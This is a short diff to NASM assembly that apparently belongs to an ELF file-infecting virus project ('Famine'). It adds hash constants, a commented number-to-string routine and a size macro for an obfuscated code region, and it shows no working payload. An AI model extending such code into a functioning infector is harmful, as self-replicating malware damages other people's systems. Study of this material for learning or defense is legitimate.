@@ -11,8 +11,28 @@
 %define ENTRY 16      ; new entry + opcode
 %define MAPPED_FILE 8 ; mmap
 
+%define FNV_PRIME_64 1099511628211
+%define FNV_OFFSET_64 0xcbf29ce484222325
+
+; String uint64ToString(uint64_t input) {
+;   String result = "";
+;   uint8_t base = 10;
+
+;   do {
+;     char c = input % base;
+;     input /= base;
+
+;     if (c < 10)
+;       c +='0';
+;     else
+;       c += 'A' - 10;
+;     result = c + result;
+;   } while (input);
+;   return result;
+; }
 
 %define FAMINE_SIZE _v_stop - _famine
+%define CHUNKS_SIZE _v_stop - obfu
 
 ; ELF_HDR_DEFINITION
 %define ET_EXEC 0x02
